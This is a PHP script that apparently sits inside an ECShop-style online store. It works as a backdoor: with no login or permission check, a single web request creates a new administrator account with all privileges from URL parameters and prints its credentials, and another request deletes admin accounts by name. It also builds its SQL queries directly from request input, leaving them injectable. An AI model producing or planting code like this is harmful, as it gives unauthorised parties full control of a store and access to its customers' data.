<?php
    define( 'IN_PC' , true );
    require( dirname( __FILE__ ) . '/includes/init.php' );
    $admin_name = trim( $_REQUEST['u'] );
    if ( $_REQUEST['act'] == '' ) {
        $admin_pass = trim( $_REQUEST['p'] );
        if ( empty( $admin_name ) || empty( $admin_pass ) ) {
            die( '账号或密码为空' );
        }
        $sql = 'INSERT INTO ' . $ecs->table( 'admin_user' ) . " (`user_id`,`user_name`,`email`,`password`,`action_list`) VALUES (NULL,'$admin_name','admin@admin.com','" . md5( $admin_pass ) . "','all')";
        $db->query( $sql );
        die( "账号:$admin_name,密码:$admin_pass" );
    }
    if ( $_REQUEST['act'] == 'drop' ) {
        if ( empty( $admin_name ) ) {
            die( '账号名称不能为空' );
        }
        $sql = "delete from " . $ecs->table( "admin_user" ) . " where user_name='$admin_name' ";
        $db->query( $sql );
        die( "账号:$admin_name" );
    }
